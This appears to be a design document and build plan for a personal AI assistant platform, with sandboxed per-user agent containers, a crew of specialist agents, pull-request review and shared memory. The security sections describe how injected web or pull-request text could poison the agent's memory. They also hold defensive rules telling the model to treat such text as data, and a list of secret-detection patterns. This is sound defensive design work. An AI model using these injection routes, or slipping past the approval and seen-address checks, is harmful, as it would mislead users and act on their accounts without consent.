# Personal Agent MVP: HLD and build plan

**Who this is for:** a developer, or an AI coding agent, building the MVP phase by phase. Every phase in **section 9** says what to build, which sections to read, and how to know it's done.

**Diagram:** godraw canvas **"Backend + Sandbox Manager — HLD"**. It was drawn before the rename, so its "sandbox-manager" boxes are the **vm-manager** in this doc.
(page 1 components & connections · page 2 one message through the system · page 3 inside the vm-manager · page 4 queues & automations)

**What the product is:** a personal AI assistant users message on **Telegram or the web app**. WhatsApp and iMessage are built but **switched off at launch** (section 0.3). It does real work in about **25 apps + the user's own MCP servers**, asks before risky actions, remembers the user, runs reminders and automations, and bills in **credits**. **Every user gets their own sandboxed container** running the Hermes agent. The agent the user texts is the lead of a small **crew** (section 0.7): Byte codes, Patch reviews code, Scout researches.

---

## Contents

0. How it works (read first)
1. Architecture decisions: services, microservices, gRPC
2. Folders and repos
3. Components and tools
4. Networks and communication
5. Backend: api + worker
6. vm-manager (Go)
7. Plans, credits and coupons
8. Data model
9. **Build phases** (hand these to the AI one at a time)
10. Failures and security
11. Scout's browser (first version)

---

## 0. How it works (read first)

### 0.1 Auth: who is allowed to do what

| Caller | How it proves who it is | What we get from it |
|---|---|---|
| **Web user** | Signs in with **Clerk** → the web app sends Clerk's session token on every request → the api checks it with Clerk's SDK | The user id |
| **Chat user** (WhatsApp / Telegram / iMessage) | Their chat id must be **linked** to an account first (below) | The user id, looked up from `channel_links` |
| **External service webhooks** (Meta, Telegram, Sendblue, Clerk, Polar, Composio) | Each is **signed or carries our secret**; the api checks before reading anything | "This really came from Meta/Clerk/…" |
| **A user's container** (Hermes calling the Platform MCP) | A **per-container token**, made by the vm-manager at creation and stored only as a hash. The api turns it into the user id | The user id, which the container **can't choose or fake** |
| **Internal services** (backend → vm-manager over gRPC, vm-manager → Bridge) | A shared internal secret in gRPC metadata on the private network (mutual TLS later); a per-container Bridge secret | "This is our own service" |

- **Sign-up:** Clerk sign-up → signed `user.created` webhook → the api creates the user row, gives the **100 free sign-up credits**, and adds a *create-sandbox* job.
- **Linking a chat app:** the web app shows a **one-time code** (random, single use, expires in 10 minutes) → the user sends it to our bot or number → the webhook matches it → `channel_links` saves "this chat id = this user". Only a channel that is switched on can be linked (section 0.3).
- **Unknown senders:** they get only a "please link your account at …" reply. The message never reaches an agent.
- **Deleting an account:** `user.deleted` webhook → job → delete the container and data, revoke the LiteLLM key, remove the links.

### 0.2 BullMQ: how jobs flow

- **The roles:** Redis holds the queues. The **api only adds jobs**; the **worker only runs jobs**. The Postgres **`events`** table is the permanent record of everything that came in.
- **The idea:** webhooks never do work. They check, save, add a job, and answer 200 fast.

**Four queues**, so slow work never blocks fast work:

| Queue | Holds |
|---|---|
| **inbound** | Chat messages, approval answers, app-event triggers, fired automations |
| **outbound** | Replies and buttons to send |
| **scheduled** | Reminders (delayed jobs) and repeating automations |
| **system** | Create/delete sandbox, usage sync, monthly credit grants, cleanup, backups |

**A job's life:** *waiting* → *active* → *completed*. On failure it's retried after a growing delay (5 s, 30 s, 2 min…, up to 5 tries), then marked *failed* and shown in the admin view.

**What keeps it correct:**
- **No duplicates:** the job id is the event id.
- **One run per user at a time:** a Redis lock per user. A busy user's job is pushed back 2 seconds, so order is kept.
- **Worker crash:** BullMQ puts "stalled" jobs back, and every step checks "already done?".
- **Redis lost:** Redis saves to disk. A recovery step re-adds jobs for events not marked done, and automations are re-registered from Postgres.
- **Admin dashboard:** Bull Board, admin-only.

### 0.3 WhatsApp: in and out

**Setup:**
1. A Meta business app with WhatsApp Cloud API (start with the free test number).
2. Our webhook URL + verify token.
3. Subscribe to messages; get a permanent access token.
4. Get templates approved: *reminder*, *approval needed*, *task done*.

**Incoming:**
1. Signed webhook → verify → look up `channel_links` → save the event (unique on WhatsApp's message id) → **inbound** job → 200.
2. Status updates (sent, delivered, read) only update message status.
3. Voice, images and documents arrive as a media id → the worker downloads them → voice is turned into text.

**Outgoing** (always through the **outbound** queue):
- **Within 24 hours** of the user's last message: free text + reply buttons (max 3). Approval buttons carry the approval id.
- **After 24 hours:** only an **approved template** (paid per message).
- Long replies are split (~4,096 characters). Failed sends are retried. A blocked number is marked, and the web app is used instead.

**Telegram:** no 24-hour rule; inline buttons. **iMessage** (Sendblue): no buttons, so the user replies "yes" or "no".

**Launch channels and the switch** (decided 2026-10-03, `docs/launch-plan.md` D2 and D3):

- **On at launch:** Telegram and the web app. Phone users use Telegram plus the web app's phone layout.
- **Off at launch:** WhatsApp and iMessage. The code stays. WhatsApp's terms forbid a general AI assistant outside the EEA, and the unofficial iMessage route can be cut off without appeal (`docs/market-and-mvp.md` section 6). There is no SMS channel.
- **The setting:** `ENABLED_CHANNELS`, a comma-separated list of `telegram`, `web`, `whatsapp`, `imessage`. Default `telegram,web`. It is checked at startup; an unknown name stops the process.
- **When a channel is off:**
  - No link code can be created for it: `403 channel_disabled`.
  - Its webhook answers 200 and does nothing: no signature check, no event, no job. WhatsApp's verification handshake answers 403.
  - The worker ignores a message from it that was queued earlier, and never sends to it (the message is marked failed).
  - With `web` off, web chat (`POST /v1/messages`) answers `403 channel_disabled`. The rest of the web app keeps working.
  - Links made earlier stay listed, so the user can unlink them.
- **Telling the apps:** `GET /v1/channels` returns `available`, the list of channels that are on. The web app offers only those.

### 0.4 Automations

- **Source of truth:** the `automations` table. BullMQ only holds the timers.

| Kind | Example | Timer |
|---|---|---|
| Once | "Remind me Friday 10am…" | Delayed job in *scheduled* |
| Repeating | "Every Monday 9am…" | BullMQ repeating job scheduler (cron + user timezone), keyed by automation id |
| App event | "When my boss emails me…" | Composio trigger → webhook → inbound job |

- **Create:** the user says it → Hermes calls *create_automation* → the api checks the plan limit, a 15-minute minimum interval and the timezone → saves → registers the timer → confirms.
- **Fire:** a *run-automation* job goes through **the same path as a normal message**, with the saved instruction.
- **Safety:** each run costs credits. An automation auto-pauses at 0 credits or after 3 failures in a row.
- **Recovery:** on worker start, re-register all enabled automations from Postgres.
- **Pull-request review** is an app-event automation with a preset, turned on per repo by the user (section 0.8).

### 0.5 Hermes inside a container

**The container:**
- **Hermes Agent** (Python) + **Bridge** (our adapter, plugged in as a Hermes messaging platform).
- **Config at creation:**
  - model = LiteLLM (via the egress proxy) with **this user's key**
  - MCP = **Platform MCP** (with this container's token) + the user's own MCP servers
  - Hermes's own chat connectors and cron **off**
  - memory, skills, sessions and files in **/data**

**One turn:**
1. The vm-manager **delivers** a message to the Bridge. The backend has already put what is known about the user at the top of its text, and a recap of the chat if the engine changed (section 0.9).
2. The Bridge hands it to Hermes in that chat's session.
3. Hermes loops: LLM → tool call on the Platform MCP → result → … → final answer.
4. The final answer goes out through *send_message* (outbound queue).
5. The Bridge reports **turn done** → the vm-manager's *Deliver* stream ends → the worker releases the user's lock.

**Approvals never block:** *request_approval* returns "pending", and Hermes ends its turn ("waiting for your OK"). The user's ✅ or ❌ arrives later as a new message, and Hermes continues from its saved session.

**Learning:** memory and skills are updated in /data, so each agent improves for its own user only. That memory belongs to one engine and is lost to the user when they switch engines. The memory that every engine shares is on the platform (section 0.9).

### 0.6 Closing containers

**The rule:** stop when **not in a turn** **and** quiet for **3 minutes**. Activity means every delivered message and every Platform MCP call; the api sends *Touch* to the vm-manager.

**A stop:**
1. The idle reaper (every minute) finds a match.
2. It sends a polite shutdown, and Hermes saves to /data (up to 20 s).
3. The container stops (RAM freed; container and /data kept).
4. It's marked stopped, and the awake period is recorded for credits.

**Other stops:**
- **Capacity guard:** stop the longest-idle, not-busy container first.
- **Stuck turn:** over 15 minutes → force-stop, and the user is told.
- **New image:** stopped containers are re-created on their next wake (/data kept).
- **Deleted:** only on account deletion.

### 0.7 The crew

Decided 2026-10-03 (`docs/launch-plan.md` D7 and section 4). One lead and three specialists. Echo, Pitch and Tock are dropped.

| Id | Name | Job | Tools |
|---|---|---|---|
| `tex` | **Tex** | The lead: the agent the user texts. It plans the job, hands parts to specialists and answers the user | Everything the agent has today |
| `byte` | **Byte** | Coding: writes and changes code, opens pull requests | Files, shell, git (through the git gateway), the platform tools |
| `patch` | **Patch** | Code review: runs several reviewers (bugs, security, tests) | Read access to the code, shell for running tests and diffs, the platform tools for commenting |
| `scout` | **Scout** | Research: searches the web and reads pages. **Only Scout searches the web.** On Max it also drives a real browser, inside the user's own container (section 11) | One web search (the engine's own, or the platform's `web_search`: see "Web search" below), `read_page`, and on Max the browser. **No shell and no app actions** |

These ids are fixed. Both repos use them.

**Web search: who searches, and with what** (decided 2026-10-04, `docs/launch-plan.md` D7):

- **Only Scout searches the web.** Tex, Byte and Patch hand a search to Scout. The agent image decides who may call a search tool. The platform does not check it: every call from a container arrives with the same container token, so the platform can't tell the crew members apart.
- **The engine's own search comes first.** When the user's engine has its own web search, Scout uses that one and the platform is not involved. Today that is Claude Code on the user's Claude plan; Codex later. It costs **no credits** and works on **every plan**.
- **Otherwise the platform's `web_search`,** backed by Brave (section 5.1). It is a **Max feature** (section 7.1) and costs **1 credit per search** (section 7.2). On Free and Pro the tool refuses with a message the agent can read.
- **What that means on Free and Pro with Hermes** (the user's own API key, or Textcrew AI): Scout can't search. It can still read a page whose address the user gives it; `read_page` is free on every plan.
- **Which search Scout is given** is set in the agent image (`vm-manager`), per engine. This repo only decides what the platform's tool does when it is called.
- **Reading what the engine's own search found** (decided 2026-10-04, after the first live run). The results of an engine's own search never pass through the platform, so they are not "seen" addresses. On the server, Scout searched with Claude Code's built-in search and `read_page` then refused every result. So **on Claude Code `read_page` opens any public address; on Hermes the seen-address rule stays** (section 5.1 says why the two differ, and section 10.3 what that leaves open).

**In the agent image** (`vm-manager`, not this repo):

- **Defined once,** in the Bridge: a description, a role prompt and a tool list for each specialist. The same definitions serve both engines. No change to the gRPC proto.
- **Claude Code:** the definitions are passed as sub-agents. Only the lead may start them; a specialist can't start its own helpers.
- **Hermes:** the lead gets the same role prompts to use with its built-in delegation, one level deep.
- **How many at once:** at most 3 specialists per job to start with.
- **Why Scout has so few tools:** text from a web page is not trusted. Scout can't run commands or use the user's apps, so a page can't make it send or delete anything.
- **Known limit on Hermes** (from the agent-image work, 2026-10-04): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction in the role prompt. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The control that holds on both engines is on the platform: approvals for risky app actions. The seen-address rule of `read_page` (section 5.1) is the platform's second control on Hermes, where the tool lists don't hold; on Claude Code it was given up for the tool lists (decided 2026-10-04).

**On the platform** (this repo):

- **Crew list:** `GET /v1/crew` returns the four members (id, name, lead or specialist, role, description, whether it is available yet), so the apps don't hard-code them. Scout also carries `browser`: the plan it needs (Max), whether this deployment has it (`available`, the setting `BROWSER_AVAILABLE`) and whether it is on for this user (`enabled`: the deployment has it and the user is on Max). Section 11.5. Scout's description says what needs Max (web search through Textcrew, and the browser) and what doesn't (the search built into the user's own Claude plan).
  - **Available yet?** The specialists live in the agent image, and the backend can't see which image is deployed. The setting `CREW_AVAILABLE` lists the specialists that are switched on (default `byte,patch,scout`). Tex is always available.
- **Progress lines:** when a specialist starts or finishes, the Bridge sends a progress event whose text starts with the member's name and a colon, for example `Scout: reading 4 pages`.
  - **Web chat:** the worker passes every progress line of a turn to the live stream as `agent.progress` (the text, the crew member if the line names one, the time). Lines without a name, such as `using web_search`, go the same way with no member.
  - **Telegram and other chats:** nothing is sent for a progress line. A chat only gets what the agent itself sends with `send_message`, as before, so the user isn't spammed.
  - **Activity log:** a line that names a crew member is also saved (`crew_progress`, with the member), so the activity page shows who did what. At most 30 per turn; the text is cut at 300 characters.
- **Scout's platform tools run on the platform,** not in the container: `web_search` (Max only) and `read_page` on the Platform MCP (section 5.1). They don't open the container's network. **The browser is different:** it runs in the container, and a container with the browser on can reach any public website (sections 4, 10.3 and 11).
- **The browser switch:** the platform turns the browser on for Max users and off for everyone else, through the vm-manager (section 11.3).
- **Pull-request review** uses Patch (section 0.8).

### 0.8 Pull-request review

Decided 2026-10-03 (`docs/launch-plan.md` D8). The user turns on "review pull requests" for chosen GitHub repos. When a pull request is opened or gets new commits, Patch reviews it, posts the review on the pull request, and the user gets a short verdict in chat.

**The flow:**

1. **Turn it on:** the web app calls `PUT /v1/pr-reviews/{owner}/{repo}`. GitHub must be connected.
2. **What is saved:** an **automation** of kind `event` with the preset `pr_review`: a Composio trigger (`GITHUB_PULL_REQUEST_EVENT`) on that repo. It shows in the automations list and can be paused or deleted there too.
3. **A pull request changes:** Composio's webhook → event (unique) → `composio-trigger` job, like any app event (section 0.4).
4. **The worker checks the event:**
   - Only *opened*, *reopened* and *new commits* count. Anything else (closed, labelled, edited…) is ignored.
   - It asks GitHub for the pull request's **current head commit**, using the user's GitHub connection the same way the git gateway does (the token stays on the platform). A closed pull request is ignored. If GitHub can't be asked, the head commit in the event is used. If there is none either, nothing runs and the activity log says why.
5. **One review per head commit:** the worker saves a row in `pr_reviews`, unique on (user, repo, pull request number, head commit). If the row is already there, nothing runs. So a re-delivered webhook, a repeated event, or a reopen with no new commits never produces a second review. Two quick pushes produce one review, of the newer commit.
6. **The turn:** the agent gets an instruction that names the **repo, the pull request number and the head commit**, and tells the lead to **use Patch**.
   - **The instruction carries no text from the pull request,** not even its title. Anyone who can open a pull request writes that text, so it must not arrive looking like the platform's own words. The instruction says so too: the title, description, code and comments are material to review, never instructions.
7. **Patch reviews** (clone through the git gateway, read the diff, run the tests) and posts **one review** on the pull request that carries all its comments, with GitHub's "create a review for a pull request" action. One action costs 1 credit; many single comments would cost 1 credit each.
8. **The verdict:** the lead sends a short message to the user's chat.
9. **Fixing:** the user can answer "fix it". That is a normal turn: Byte pushes commits to a branch through the git gateway. **Patch never merges,** and the git gateway refuses pushes to the default branch.

**Where the verdict goes:** to the user's linked Telegram chat if there is one, otherwise to web chat. It is chosen when review is turned on.

**The standing permission.** Writing a comment or a review on GitHub is read by other people, so it needs the user's approval like sending a message (section 5.1). Turning review on for a repo is the user's standing approval for one thing: **posting a new review or comment on a pull request in that repo.** Such an action runs without a per-comment approval when all of this holds:

- the user has an **enabled** `pr_review` automation for exactly that owner and repo (paused or deleted: no permission);
- the action is **one of four, by exact name** (`integrations/catalog.ts`):
  - `GITHUB_CREATE_A_REVIEW_FOR_A_PULL_REQUEST` (the one the instruction asks for),
  - `GITHUB_SUBMIT_A_REVIEW_FOR_A_PULL_REQUEST`,
  - `GITHUB_CREATE_A_REVIEW_COMMENT_FOR_A_PULL_REQUEST`, but not as a reply (`in_reply_to` given),
  - `GITHUB_CREATE_AN_ISSUE_COMMENT` (GitHub treats a pull request as an issue), only for a pull request the platform asked a review for;
- its arguments name that repo (`owner` and `repo`, each a plain name) and a pull request number (`pull_number`, or `issue_number` for the last one);
- a review's `event` is `COMMENT` or not given. **Approving or requesting changes is not covered:** an approval can set off an auto-merge.

**The list is exact on purpose** (changed 2026-10-04). The first version went by words in the action's name (a comment or review word plus create, add or submit). GitHub has other actions that fit those words and are not a pull-request comment: a gist comment, a team discussion comment, a commit comment, a reaction. With the repo and a pull request number added to their arguments they would have passed. Now any action not on the list needs approval, whatever its arguments say. Editing, deleting, dismissing, replying, merging and closing were never covered.

- **If Composio names one of the four differently,** the permission simply doesn't apply and the review asks for approval: the safe side. The names follow Composio's GitHub toolkit as published; they have not been checked against a live Composio account (first live run, `docs/launch-plan.md` Ops).

Everything else risky still needs approval, in the same turn too: merging, a comment on another repo, an email.

- **Only the user can turn it on,** from the web app with their own session. The agent can't give itself this permission: `create_automation` can't set the preset.
- The action still costs 1 credit and is still written to the activity log, marked as covered by pull-request review.

**How it counts:**

- **Plan limit:** each repo with review on is one automation of the plan's limit (Free 1, Pro 5, Max 50).
- **Credits:** each review is a turn. It costs what any turn costs (Textcrew AI if that is the user's AI, awake time) plus 1 credit for the posted review.
- **Pausing:** at zero credits, and after 3 failed reviews in a row, like any automation.
- **Teams** should use an API key for this, not one person's Claude plan (`docs/market-and-mvp.md` section 6.5).

### 0.9 Shared memory

Decided 2026-10-03 (`docs/launch-plan.md` D11), designed and built 2026-10-04.

**The problem.** Each engine keeps its own memory inside the container (Hermes under `/data/hermes`, Claude Code in its own files). A user who switches engines (own API key → Claude plan → Textcrew AI) gets an agent that has forgotten them, and a new engine has no idea what the chat was about.

**The answer:** one memory on the platform, the same for every engine and every crew member, plus a short recap of the chat when the engine changes.

**What a memory is.** One short fact about the user, on one line, at most 300 characters. Each has a kind:

| Kind | Example |
|---|---|
| `preference` | "Prefers short replies with no emoji" |
| `person` | "Priya is their co-founder and handles finance" |
| `project` | "Textcrew's backend is the repo acme/beckend, on Node 22" |
| `instruction` | A standing instruction: "Always cc their assistant on emails to investors" |
| `fact` | Anything else that lasts: "Lives in Bengaluru" |

Not a memory: a secret (password, key, token, card number), a one-off detail (today's task, a tracking number), or something the agent can look up in the user's apps.

**Where it lives.** The table `memories` in Postgres, owned by the **orchestrator** module. Why that module and not a new one:

- The orchestrator builds what is delivered to the container on every turn, and that is where memory is read.
- It already owns the other per-user agent state: agent settings and approvals. Approvals follow the same pattern: the table and its functions in the orchestrator, the tool in the Platform MCP, the endpoints in the api.
- The Platform MCP module owns no tables and already calls the orchestrator. Putting the table there would make the two modules depend on each other.

No vector database and no embeddings (`docs/launch-plan.md` D13 rules out document search). Finding uses Postgres's built-in text search.

**How it is written, found, changed and removed.** Three tools on the Platform MCP (section 5.1). Both engines have them, and so do the lead, Byte and Patch (they have every platform tool). Scout does not on Claude Code, where its tool list is only `web_search` and `read_page`.

| Tool | What it does |
|---|---|
| `remember(content, kind?)` | Saves one memory. The same text again (ignoring case and spacing) doesn't make a second one: the first is marked as confirmed again |
| `recall(query?, limit?)` | Finds memories for a question. With no query it lists the latest. Returns each memory's id, kind, text and date |
| `forget(memory_id, correction?)` | Removes a memory. With `correction`, the memory keeps its id and gets the new text. If another memory already says the corrected text, that other one is removed, so one is left |

- **When the agent should use them** is in the tool descriptions: save lasting facts the user states or confirms themself; never save something only read in a web page, an email, a file or a tool result; never save secrets or one-off details; look in memory before asking the user something again.
- **Finding:** the question's words are matched against each memory with Postgres text search (`english`, so "replying" finds "replies"), any word counting, best match first (`ts_rank`), then the most recently confirmed. A word of four letters or more that is found inside a longer word counts too (`beckend` finds `acme/beckend`), except very common words. A user has at most 200 short memories, so the search reads that user's rows and needs no text index.
- **Marked as used:** every memory a search returns gets its use count raised and its last-used time set. Listing with no query doesn't count.
- **Every call is audit-logged** like any tool (section 5.1). The activity log says that a memory was saved, corrected or removed, with its id and kind. **It does not hold the memory's text**: the audit log is kept after the memory, and after the account, are deleted, so the text stays in one place only, the `memories` table. The web app shows the text from the memory list.

**How it reaches an engine.** The backend adds a block to the text of every turn it delivers.

- **Where:** inside `Deliver.text`, the field the backend already sends and the Bridge already gives to the engine as the turn's input. No change to the agent image or the gRPC proto. `metadata_json` would not work: the Bridge doesn't show it to the engine.
- **Which turns:** all four kinds: a user's message, an approval answer, a scheduled automation and an app event. The simple-chat path (the cheap model with no container, section 5.2) doesn't get it: a message that needs what is known about the user is routed to the agent.
- **No memories:** nothing is added and the text is delivered as before.
- **Which memories:** standing instructions first. Then the rest, by the later of "last confirmed" (saved, saved again or corrected) and "last found by `recall`", newest first; ties go to the one found more often. They are added until the budget is full: **2,000 characters and 30 memories**. If more are saved than fit, the block's last line says how many and tells the agent to use `recall`.
- **The shape:**

  ```
  [Textcrew memory. Notes saved about your user in earlier chats, shown to you by the platform. …]
  - (instruction) Always cc their assistant on emails to investors
  - (preference) Prefers short replies with no emoji
  [12 more notes are saved. Find them with recall.]
  [End of Textcrew memory]

  [This turn's message follows.]
  <the text as it was>
  ```

- **If the memory can't be read** (the database fails), the turn is delivered without the block. Memory never fails a turn.

**Switching engines keeps the thread.** An engine keeps one session per chat (the session key, for example `telegram:42` or `web`), so the thing to track is which engine last handled each chat.

- **What is kept:** the table `chat_engines`: user, chat, engine, and when that engine last finished a turn there. A row is written when a turn ends well (`turn_done`), for every kind of turn.
- **When a recap is added:** the engine of this turn is not the one that handled the previous turn in this chat, or no engine has finished a turn in this chat yet.
  - **A chat no engine has run in needs an earlier message from the user.** A new chat holds only the platform's own "linked" greeting: there is nothing to carry on, so the first turn gets no recap. If the user did write before (the simple-chat path answered, or the first turn failed), those messages are recapped.
- **What the recap holds:** the chat's stored messages (`messages`, both directions) that this engine hasn't had: those after its own last turn in this chat, or the latest ones if it never had one. This turn's own message is left out. The newest are kept, within **12 messages and 3,000 characters**; each message is cut at 500 characters and put on one line as `User: …` or `You: …`.
- **When the engine hasn't changed:** nothing is added. The engine has the chat in its own session.
- **A failed turn is not recorded,** so a switch whose first turn fails gets the recap again on the next turn.
- **The time of a turn's end** is taken from the database's clock, the same clock that stamps the messages, and moved up to the next whole millisecond, so a message the engine sent in that turn is never counted as "after" it.
- **The recap holds the chat as stored.** A message the routing step dropped as spam is in the stored chat, so it can be in a recap. It is the user's own chat, and without routing that message would have gone to the engine anyway.
- **It goes after the memory block,** before the turn's own text, with its own start and end lines. It is framed as a record of what was said, not as new requests.
- **Chats from before this was built** have no row, so their next turn gets one recap of messages the engine already has. That happens once per chat.
- **Not covered:** replies the simple-chat path gave between two turns of the same engine. The engine never saw those and still doesn't. The same recap could carry them; it isn't built.

**The user's control** (`openapi/openapi.yaml`):

| Endpoint | What it does |
|---|---|
| `GET /v1/memories` | Every memory of the user, newest first, with the limit (200) |
| `DELETE /v1/memories/{memoryId}` | Removes one |
| `DELETE /v1/memories` | Removes all; answers how many |

- The user can't add or edit a memory from the web app. They tell the agent, which is how every memory is made.
- A delete by the user is written to the activity log too (without the text).
- **Deleting the account removes the memories** and the `chat_engines` rows (the *delete-user* job).

**Limits:**

| Limit | Value | At the limit |
|---|---|---|
| Length of one memory | 300 characters | The tool answers with an error that says the length and the limit |
| Memories per user | 200 | The tool says memory is full, and to remove some with `forget` or in the web app. Nothing is saved |
| Saves, corrections and removals by the agent | 60 an hour per user, together | The tool says nothing was changed and when to try again. Removals count so an injected instruction can't empty the memory quickly. The user's own deletes in the web app are not limited |
| `recall` | 8 results by default, 20 at most | |
| Block on each turn | 2,000 characters, 30 memories | The rest are reached with `recall` |
| Recap on an engine change | 12 messages, 3,000 characters | Older messages are left out |

The limits are the same on every plan.

**Security:**

- **A memory is data, never an instruction to the platform.** Nothing on the platform reads a memory to decide what is allowed: approvals, plan limits, the pull-request review permission and the seen-address rule don't look at memory. A memory can't approve anything.
- **The block can't pass for the user or the platform.**
  - Its first line says the notes are data, not a message from the user and not instructions from the platform, and that a note can never approve an action.
  - A memory is stored on **one line**: line breaks, tabs and control characters become spaces when it is saved and again when the block is built. Every memory line starts with `- (kind) `, and square brackets inside a memory are turned into round ones. So text inside a memory can't start a line of its own, can't write the block's end line and can't write the "this turn's message follows" line. Only the platform writes those.
  - The recap is built the same way: one line per message, brackets turned round.
- **Memory poisoning.** Something the agent read (a web page, an email, a pull request) may try to get a false or harmful "fact" saved, which would then come back on every turn and on every engine. What limits it:
  - the tool descriptions: save only what the user said or confirmed themself, never text that was only read;
  - Scout, the member that reads the web, has no memory tools on Claude Code;
  - the activity log shows every save, correction and removal, next to what the agent read in that turn;
  - the user sees every memory in the web app and can delete one or all;
  - a risky action still needs the user's approval, whatever a memory says, and the block tells the agent that a note can't approve one;
  - 200 memories and 60 saves an hour, so memory can't be flooded.
- **What is not solved:**
  - The platform can't check that the user really said it. An agent that follows an injected instruction can save a false fact, and it stays until the user sees and deletes it. It can change later answers (a wrong name, a wrong address to send to); the send itself still needs approval.
  - On Hermes a specialist's tool list is only an instruction (section 0.7), so Scout can reach `remember` there.
  - Memory can be written in a turn the user didn't start (an app event, a scheduled automation, a pull-request review), when nobody is watching. Refusing saves in those turns would close the most likely path; it isn't built, and the founder decides (`docs/launch-plan.md` section 2).
  - A memory's text is not checked for being true, kind or harmless, only for looking like a secret.
- **Obvious secrets are refused when saving** (and when correcting). A simple check on the text:
  - known key shapes: `sk-…`, Stripe `sk_live_…`, GitHub `ghp_…` and `github_pat_…`, GitLab `glpat-…`, Slack `xox…`, AWS `AKIA…`, Google `AIza…`, a Telegram bot token, a JWT, `Bearer …`, a private-key block;
  - a secret word followed by its value: "password is …", "passcode: …", "PIN is …", "API key = …", "token: …", "OTP is …", "CVV: …";
  - a card number: 13 to 19 digits, with or without spaces or dashes, that pass the Luhn check;
  - a web address with a password in it, or with a parameter named like a secret (`token`, `key`, `secret`, `password`, `sig`…);
  - any other run of 32 or more letters and digits mixed (a hash, a random key), outside a web address.
  - The refusal names the kind of secret, never the text, and is written to the activity log (`memory_refused`) without the text.
  - **It is a safety net, not a guarantee.** A short password in a plain sentence ("the door code 4821"), a secret in another language, or one split in two passes. It also refuses some harmless text ("the wifi password is on the fridge"); the agent is told to say it without the secret.
- **Per user, never across users.** Every query filters by the user id, and the tools take the user id only from the container token (section 0.1). A memory id of another user answers "not found", for `forget` and for the web app's delete alike. Tested.
- **Nothing leaves the platform through memory:** memories go only to the user's own container and the user's own web app.
- **A web address inside a memory is not a "seen" address for `read_page`** (section 5.1; the rule applies on Hermes). Only the user's own messages, search results and links on read pages count. Otherwise an injected agent could save an address with the user's data in it and then read it. Tested.

**The engines' own memory is left as it is.** Hermes still learns into `/data/hermes` and Claude Code keeps its own files (section 0.5). Those stay per engine and are not copied, read or cleared by the platform. **Platform memory is the shared one:** it is what survives an engine switch, and the only one the user can see and delete from the web app.

**Not built:** editing or adding a memory from the web app; memory kept per crew member; memories that expire; search by meaning (no embeddings); telling the Bridge about memory in its own instructions (`vm-manager`), so today the agent learns of the tools from their descriptions and from the block.

---

## 1. Architecture decisions: services, microservices, gRPC

### 1.1 How many services? A modular monolith plus one separate service

| Unit | Why it's separate (or not) |
|---|---|
| **backend** (api + worker) | **One codebase, two processes.** The api and worker share the same modules, database and types. Splitting them into more microservices now would add network calls, deployments and failure points with no benefit at MVP scale |
| **vm-manager** | **A separate service**, because it's a **privilege boundary**: it's the only thing with Docker access, which is effectively root on the server. Keeping it tiny and separate limits the damage if the backend has a bug. It's also written in **Go**, the best language for Docker |
| **agent container** (Hermes + Bridge) | Separate by nature: one per user, untrusted |
| LiteLLM, egress proxy, Postgres, Redis, Caddy | Off-the-shelf infrastructure, configured rather than coded |

**Inside the backend, keep clear modules** so they could be split into services later if ever needed. Each module owns its own tables, and modules talk through function calls (same process) or queues (between api and worker):

| Module | Owns |
|---|---|
| **auth** | Users, Clerk integration, link codes, channel links |
| **channels** | WhatsApp / Telegram / Sendblue / web adapters (receive + send) |
| **events** | Webhook intake, `events` table, queue producers |
| **orchestrator** | Per-user lock, Jev routing, the wake → deliver flow, agent settings, the crew list, shared memory and the engine each chat last ran on |
| **platform-mcp** | The MCP server the agents call, including Scout's web search and page reader and the memory tools |
| **integrations** | Composio (connect, run actions, triggers), user MCP servers |
| **billing** | Plans, subscriptions, credit grants, ledger, coupons, Polar, LiteLLM keys and budgets |
| **automations** | Automation rows and timers, pull-request review |
| **admin** | Admin APIs, Bull Board, coupon creation |

**Later split candidates**, only if load demands it: *channels* (as a gateway) and *billing*.

### 1.2 Which protocol where

| From → To | Protocol | Why |
|---|---|---|
| Web app → api | **REST (JSON)** + **SSE** for live updates, defined in **`openapi/openapi.yaml`** | Simple for browsers; typed client generated from the spec |
| External services → api | **Webhooks (HTTPS POST)**, also listed in `openapi/openapi.yaml` | That's what they offer |
| api → worker | **BullMQ jobs** (async) | Decouples fast intake from slow work |
| **backend (api/worker) → vm-manager** | **gRPC** (protobuf) | Typed contract between TypeScript and Go; **streaming** for Deliver (progress → turn done); fast on the private network |
| vm-manager → Bridge (in container) | **HTTP (JSON)** on the sandbox network | Bridge is Python inside Hermes; kept simple; one secret per container |
| Container → Platform MCP (api) | **MCP over streamable HTTP**, via the egress proxy | The standard way agents call tools |
| Container → Git gateway (api) | **Git smart HTTP** (`/git/<owner>/<repo>`), via the egress proxy | Real `git clone` / `fetch` / `push` for the user's GitHub without a GitHub token in the container (section 5.1) |
| Container → LiteLLM | **OpenAI-compatible HTTP**, via the egress proxy | What Hermes speaks |
| Backend → Composio / Jev / LiteLLM admin / channel APIs / Polar | Their **HTTP APIs / SDKs** | External |

**The gRPC contract** (`vm-manager/proto/vm/v1/vm.proto`) is the source of truth. The backend generates its TypeScript client from it with **buf** (Connect-ES or grpc-js). Its RPCs:

| RPC | Type | Purpose |
|---|---|---|
| CreateSandbox | unary | New container + volume + tokens (stays stopped). Carries whether the browser is on (section 11) |
| WakeSandbox | unary | Start if needed, wait for the Bridge to be healthy |
| **Deliver** | **server-streaming** | Send a message or approval answer; stream events *accepted → working → turn_done / error* |
| Touch | unary | Refresh last-active |
| StopSandbox | unary | Polite stop (force flag for stuck turns) |
| DeleteSandbox | unary | Remove container, volume, egress rules |
| GetSandbox / ListSandboxes | unary | State, last active, resource use |
| GetUsage | unary | Awake seconds and browser seconds per user in a time window (for credits) |
| SetEgressAllowlist | unary | The user's MCP domains changed |
| SetBrowser | unary | Turn Scout's browser on or off for one user's container; it takes effect on the next wake (section 11) |
| SnapshotVolume | unary | Archive /data for backup |

**Auth on gRPC:** a shared secret in metadata; only the platform network can reach the port. Mutual TLS later.

### 1.3 Contracts are the source of truth

| Boundary | Contract file | Rule |
|---|---|---|
| Web app ↔ api (REST, SSE) and external webhooks | **`beckend/openapi/openapi.yaml`** (OpenAPI 3.1) | **Change the spec first, then the code.** The api validates every request against it and tests validate every response against it. The web app generates its client types from it |
| backend ↔ vm-manager | `vm-manager/proto/vm/v1/vm.proto` | Both sides generated from it with buf |
| agent ↔ platform | Platform MCP tool list in 5.1 | Tool names, inputs and outputs are defined once in the api and exposed via MCP |

**How the OpenAPI spec is used:**
- **CI lints it** (Redocly): an invalid spec fails the build.
